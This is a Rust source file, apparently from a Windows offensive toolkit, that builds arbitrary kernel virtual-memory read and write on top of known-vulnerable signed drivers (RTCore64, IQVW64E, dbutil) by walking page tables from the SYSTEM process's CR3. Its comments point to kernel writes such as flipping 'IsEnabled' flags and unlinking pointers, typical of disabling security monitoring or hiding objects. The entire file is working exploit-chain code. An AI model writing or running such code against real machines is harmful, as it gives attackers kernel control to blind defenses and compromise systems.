//! VA-aware KernelRw over a physical-memory driver + page-table walk.
//!
//! Most BYOVD drivers (RTCore64, IQVW64E, dbutil) operate on **physical**
//! addresses. The `KernelRw` trait works in kernel **virtual** addresses.
//! This adapter bridges them: each `kread/kwrite` call translates the VA to
//! physical via the 4-level page walk, then calls the driver's physical R/W.
//!
//! ## CR3 source
//! The page walk needs the kernel's CR3 (DirectoryTableBase). For kernel
//! addresses, CR3 is the SYSTEM process's DTB. We read it from
//! `PsInitialSystemProcess->DirectoryTableBase` via the physical driver
//! (chasing: resolve PsInitialSystemProcess VA → translate to PA via the
//! bootstrap CR3 → read the DTB field). The bootstrap CR3 comes from a
//! well-known physical address or NtQuerySystemInformation.

#![cfg(target_os = "windows")]

use crate::win::pagewalk::{translate_va, PhysRead, PhysReadError};
use crate::{KernelRw, KrwError};

/// Physical-memory write primitive (paired with [`PhysRead`]).
pub trait PhysWrite {
    fn write_phys(&self, pa: u64, src: &[u8]) -> Result<(), PhysReadError>;
}

/// A VA-aware KernelRw backed by a physical-memory driver + page walk.
/// `P` must support BOTH physical read AND physical write.
pub struct VaKernelRw<P: PhysRead + PhysWrite> {
    phys: P,
    /// The kernel CR3 (DirectoryTableBase) for VA→PA translation.
    cr3: u64,
}

impl<P: PhysRead + PhysWrite> VaKernelRw<P> {
    pub fn new(phys: P, cr3: u64) -> Self {
        Self { phys, cr3 }
    }
}

/// Adapt PhysReadError → KrwError.
fn map_phys_err(e: PhysReadError) -> KrwError {
    match e {
        PhysReadError::Ioctl => KrwError::Other("physical IOCTL failed".into()),
        PhysReadError::NotPresent { level } => {
            KrwError::Other(alloc::format!("page not present at {:?} level", level))
        }
        PhysReadError::Overflow => KrwError::Other("physical address overflow".into()),
    }
}

impl<P: PhysRead + PhysWrite + Send + Sync> KernelRw for VaKernelRw<P> {
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        // Chunk reads by 4KB page boundary — consecutive virtual pages are
        // rarely mapped to contiguous physical pages. Reading across a boundary
        // without re-translating fetches data from unrelated physical pages
        // (or past physical RAM), triggering bus errors / BSOD. Mirror kwrite.
        let mut va = kaddr as u64;
        let mut remaining = dst;
        while !remaining.is_empty() {
            let page_off = (va & 0xFFF) as usize;
            let bytes_in_page = 0x1000 - page_off;
            let chunk_len = remaining.len().min(bytes_in_page);
            let (chunk, rest) = remaining.split_at_mut(chunk_len);
            let pa = translate_va(&self.phys, self.cr3, va).map_err(map_phys_err)?;
            self.phys.read_phys(pa, chunk).map_err(map_phys_err)?;
            va += chunk_len as u64;
            remaining = rest;
        }
        Ok(())
    }

    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
        // Write crossing a page boundary: walk each 4KB page separately.
        // Most kernel writes are small (u64 IsEnabled, pointer unlink) and
        // fit in one page, but handle the general case for correctness.
        let mut va = kaddr as u64;
        let mut remaining = src;
        while !remaining.is_empty() {
            // Bytes left in the current 4KB page.
            let page_off = (va & 0xFFF) as usize;
            let bytes_in_page = 0x1000 - page_off;
            let chunk_len = remaining.len().min(bytes_in_page);
            let (chunk, rest) = remaining.split_at(chunk_len);

            let pa = translate_va(&self.phys, self.cr3, va).map_err(map_phys_err)?;
            self.phys.write_phys(pa, chunk).map_err(map_phys_err)?;

            va += chunk_len as u64;
            remaining = rest;
        }
        Ok(())
    }
}

// SAFETY: VaKernelRw owns its PhysRead + PhysWrite + a u64 CR3.
// P: Send+Sync (by the trait bound) → VaKernelRw: Send+Sync.
unsafe impl<P: PhysRead + PhysWrite + Send + Sync> Send for VaKernelRw<P> {}
unsafe impl<P: PhysRead + PhysWrite + Send + Sync> Sync for VaKernelRw<P> {}
